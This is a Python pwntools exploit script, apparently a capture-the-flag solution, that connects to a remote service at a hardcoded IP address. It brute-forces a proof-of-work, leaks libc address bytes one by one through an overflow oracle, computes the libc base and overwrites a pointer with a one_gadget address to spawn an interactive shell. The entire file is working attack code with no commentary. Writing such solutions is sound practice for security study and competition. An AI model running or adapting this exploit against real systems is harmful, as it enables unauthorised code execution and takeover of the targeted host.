from pwn import *
from hashlib import sha256
import string

#context.log_level='debug'

def dopow():
    chal = c.recvline()
    post = chal[12:28]
    tar = chal[33:-1]
    c.recvuntil(':')
    found = iters.bruteforce(lambda x:sha256(x+post).hexdigest()==tar, string.ascii_letters+string.digits, 4)
    c.sendline(found)

#c = remote('127.0.0.1',9999)
c = remote('47.75.9.127', 9999)
dopow()

#pause()
size=32
c.sendlineafter('size: ',str(size))
off=0x40 # around 1/16
#off=input()

def doalign(x):
    return 16*((x+8+30)/16)+0x10

tmp=0x7f
for i in range(3,7):
    c.sendlineafter('content: ','a'*doalign(size)+chr(off-i))
    i=0
    while i<256:
        i+=1
        c.sendlineafter('content: ','a'*i)
        res=c.recvline()
        if 'OVERFLOW' in res:
            size = i-1
            break
    if size<0x20:
        log.info('FAILED')
        exit()
    tmp=tmp*256+size
    print size
tmp=(tmp-0x208)*256
libc_base = tmp
log.info("libc: "+hex(libc_base))
one = libc_base + 0x4526a
c.sendlineafter('content: ','a'*doalign(size)+chr(off))
c.sendlineafter('content: ','aa')
size=0
#pause()
c.sendlineafter('content: ','a'*(doalign(size)+8)+p64(one)[:-2])
c.interactive()
